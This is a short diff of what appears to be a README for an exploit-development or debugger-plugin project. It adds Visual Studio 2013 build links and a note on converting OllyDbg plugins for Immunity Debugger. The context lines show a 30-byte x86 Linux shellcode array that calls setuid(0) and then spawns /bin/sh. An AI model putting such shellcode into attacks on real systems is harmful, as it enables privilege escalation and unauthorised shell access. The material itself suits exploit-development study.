@@ -98,3 +98,12 @@ char sc[] = /* 7 + 23 = 30 bytes */
 "\x6a\x17\x58\x31\xdb\xcd\x80"
 "\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";
 ```
+
+## Compilation
+
+Visual Studio 2013
+* https://my.visualstudio.com/Downloads?q=visual%20studio%202013&wt.mc_id=o~msft~vscom~older-downloads
+* https://go.microsoft.com/fwlink/?LinkId=532495&clcid=0x409
+
+WARNING: To convert ollydbg plugin to immunity debugger plugin just use auxtools/PluginFix with ollydbg plugin dll generated
+
